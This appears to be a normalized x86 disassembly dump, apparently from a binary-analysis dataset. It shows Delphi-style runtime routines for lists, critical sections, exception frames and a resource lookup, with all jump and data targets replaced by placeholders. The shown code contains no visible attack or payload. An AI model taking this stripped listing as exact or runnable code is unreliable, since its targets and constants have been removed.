call sub_4031f4
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4126d4
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4137bc
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_412a78
push ebx
push esi
push edi
push ebp
call sub_403598
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_403224
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403214
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403580
mov eax [ esi + 0x4 ]
mov edx edi
call sub_413918
call sub_403224
inc edi
dec ebp
jne r-xdata
sub_412ad4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_413918
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_412664
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_412b18
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_412790
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_413918
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_412b5c
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_412bdf
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_403174
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b42c
call sub_403998
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412be6
lea eax [ ebp - 0x10c ]
call sub_403f5c
retn
sub_412bec
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_412ad4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4125f8
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_412b5c
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_413918
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413918
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403438
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_412ad4
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413808
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_4137bc
sub_412cd8
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413918
mov edx ebp
call sub_4128dc
test al al
jne r-xdata
sub_412d1c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4126d4
mov edx eax
mov eax [ edi + 0x4 ]
call sub_4137bc
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413918
mov eax [ eax + 0xc ]
mov edx ebp
call sub_413974
test eax eax
jge r-xdata
sub_412d78
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413918
mov esi eax
mov edx ebp
mov eax esi
call sub_412914
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_403224
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413808
sub_412dc8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4031f4
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_412cb4
xor eax eax
push ebp
push sub_412ec7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403530
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412ece
mov eax [ rw-data ]
call sub_412d6c
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4137bc
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_413918
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4127f0
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4137bc
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_413918
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_412ece
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_412ef4
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403224
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403214
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_412f24
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_412cb4
xor edx edx
push ebp
push sub_412f9b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_412d6c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_403a44
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413918
mov edx [ ebp - 0x4 ]
call sub_412790
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_412fb8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_413018
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b42c
call sub_403998
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41301f
lea eax [ ebp - 0xc ]
call sub_403f5c
retn
sub_413024
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412cb4
xor eax eax
push ebp
push sub_41306a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_412b18
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413071
mov eax [ rw-data ]
call sub_412d6c
retn
sub_413078
push ebx
push esi
mov esi eax
mov eax esi
call sub_413024
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_412fb8
sub_413098
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412cb4
xor eax eax
push ebp
push sub_4130fd
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_412cd8
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_412cc0
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413104
mov eax [ rw-data ]
call sub_412d6c
retn
mov eax ebx
call sub_4031b0
mov ebx eax
sub_413108
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412cb4
xor eax eax
push ebp
push sub_41314a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_412d78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413151
mov eax [ rw-data ]
call sub_412d6c
retn
sub_413154
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412cb4
xor eax eax
push ebp
push sub_413196
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_412d1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41319d
mov eax [ rw-data ]
call sub_412d6c
retn
sub_4131a0
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_412cb4
xor eax eax
push ebp
push sub_4131e7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_412bec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4131ee
mov eax [ rw-data ]
call sub_412d6c
retn
sub_4131f4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412cb4
xor eax eax
push ebp
push sub_413242
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_4129b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413249
mov eax [ rw-data ]
call sub_412d6c
retn
sub_4132a8
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403530
pop ebp
retn 0x8
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_4132e0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4132a8
mov edx eax
mov eax [ rw-data ]
call sub_413bfc
pop edi
pop esi
pop ebx
retn
sub_41330c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_413c84
mov esi eax
xor edx edx
push ebp
push sub_413376
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413ce8
retn
mov edx ebx
mov eax esi
call sub_413918
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_403a44
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_413388
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_407b60
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4133c8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_403fb0
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_41340c
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_413974
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_4137bc
sub_413464
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_413918
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4134a4
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_413464
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_4134c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_40441c
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_415f20
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41353c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_415a20
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403224
retn
sub_41354c
push ebx
call sub_405cc8
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_405cc8
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_4137bc
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov ebx eax
call sub_405cc8
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov ebx eax
call sub_405cc8
mov [ eax + 0xc ] ebx
sub_4135a4
push ebx
push esi
push edi
call sub_405cc8
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_413918
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_4135d4
push ebx
push esi
call sub_405cc8
mov eax [ eax + 0x8 ]
call sub_403224
call sub_405cc8
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_413a00
mov esi eax
call sub_405cc8
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_413808
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_405cc8
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_403224
sub_413630
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4136c6
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4136cd
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_4031b0
call sub_413630
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_403174
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041c0
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_404f78
call sub_404fc8
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_4134c8
or bl al
sub_4136d8
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_413786
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_413767
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_40316c
call sub_413630
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_41354c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41376e
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_4135a4
retn
call sub_4135d4
sub_41379a
add [ eax ] al
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_4137bc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_413808
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4138a4
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4028b8
mov edx esi
mov eax ebx
call sub_413918
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41386c
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_413868
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b42c
jmp sub_403998
sub_4138a4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_4138ec
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_405a5c
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_41386c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4138f3
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_413918
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4138a4
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_413940
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_413a7c
retn
sub_413974
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_413994
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4138a4
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4028b8
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_413a0c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4138a4
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_413a5c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_413974
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_413808
sub_413a7c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4138a4
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_4026fc
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_413ab8
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4138a4
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_413a7c
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402c40
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_413808
dec ebp
inc edi
jne r-xdata
sub_413b2c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031f4
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_413b80
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403598
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_413c84
xor eax eax
push ebp
push sub_413be2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_403224
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403214
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413be9
mov eax [ ebp - 0x4 ]
call sub_413ce8
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_413bfc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_413c84
xor eax eax
push ebp
push sub_413c78
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4137bc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413974
